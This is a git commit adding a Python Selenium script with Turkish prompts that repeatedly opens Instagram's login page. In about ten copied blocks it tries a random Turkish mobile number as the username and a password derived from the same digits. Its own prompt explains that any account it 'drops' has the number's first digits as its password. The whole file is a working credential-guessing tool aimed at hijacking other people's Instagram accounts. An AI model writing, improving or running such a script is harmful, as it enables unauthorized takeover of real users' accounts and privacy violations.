0215083ee07d51c0d3e10df93f45fa71ce302b59
B4yrammllly <109522372+B4yrammllly@users.noreply.github.com>
2022-09-26 17:46:52 +0300

    Add files via upload

---
+++ B4YRAMLLY auoto insta.py
@@ -0,0 +1,268 @@
+from selenium.webdriver.common.by import By
+from selenium import webdriver
+import time
+import random
+from random import*
+
+Z = '\033[1;31m' #kırmızı
+X = '\033[1;33m' #SARI
+Z1 = '\033[2;31m' #kırmızı
+F = '\033[2;32m' #YEŞİL
+A = '\033[2;34m'#Mavi
+C = '\033[2;35m' #pembe
+B = '\033[2;36m'#turkaz
+Y = '\033[1;34m' #mor
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+pgfin = input(X+"Program'ın finished vermesi sonucunda\n"+Z1+"* İnternet hızını kontrol edin\n* yeniden başlatın \n* Hesap düşmüşmü diyekontrol edin\n"+B+"{!!!} düşen hesapların şifresi numaranın 0 dan itibaren ilk 8 hanesidir\n\ntoolu başlatmak için entera basınız ==> ")
+browser = webdriver.Firefox()
+browser.get("https://www.instagram.com")
+time.sleep(8)
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(4)
+
+
+
+
+
+
+
+
+
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(4)
+
+time.sleep(4)
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(7)
+
+
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(7)
+
+
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(10)
+
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(10)
+
+
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(10)
+
+
+
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(10)
+
+
+
+
+
+
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(14)
+
+
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(14)
+
+
+
+
+
+
+name = browser.find_element(By.NAME, "username")
+
+password = browser.find_element(By.NAME, "password")
+gir = browser.find_element(By.XPATH,"/html/body/div[1]/section/main/article/div[2]/div[1]/div[2]/form/div/div[3]/button")
+
+s = "536"
+a = "+90536"
+b = "1", "2", "3", "4", "5", "6", "7", "8", "9","0"
+c = b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]+b[randint(0,9)]
+
+
+password.send_keys(s + c)
+name.send_keys(a + c)
+time.sleep(1)
+gir.click()
+time.sleep(4)
+browser.refresh()
+time.sleep(13)
+print(Z+"TEKRAR BAŞLAT DENEME SONA ERDİ")
